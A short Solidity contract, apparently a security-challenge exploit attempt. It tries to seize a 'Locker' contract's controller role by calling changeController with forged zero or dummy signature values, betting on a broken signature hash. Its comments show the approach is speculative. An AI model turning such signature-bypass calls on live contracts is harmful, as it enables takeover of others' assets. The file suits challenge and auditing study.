// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract SimpleExploit {
    address constant LOCKER = 0x8Ff3801288a85ea261E4277d44E1131Ea736F77B;
    address constant FACTORY = 0xa16E02E87b7454126E5E10d957A927A7F5B5d2be;
    
    function exploit() public {
        // The key insight: the broken signature hash might always be the same
        // or might be predictable, breaking the replay protection
        
        // We need to become the controller. Since we don't have a valid signature,
        // we need to exploit the broken hash check
        
        // Try with zero values first - if the hash is broken, it might not matter
        (bool success,) = LOCKER.call(
            abi.encodeWithSignature(
                "changeController(uint8,bytes32,bytes32,address)",
                uint8(0),
                bytes32(0),
                bytes32(0),
                FACTORY  // Change controller to the factory (the target)
            )
        );
        
        if (!success) {
            // Try with different values
            (success,) = LOCKER.call(
                abi.encodeWithSignature(
                    "changeController(uint8,bytes32,bytes32,address)",
                    uint8(27),
                    bytes32(uint256(1)),
                    bytes32(uint256(1)),
                    FACTORY
                )
            );
        }
    }
}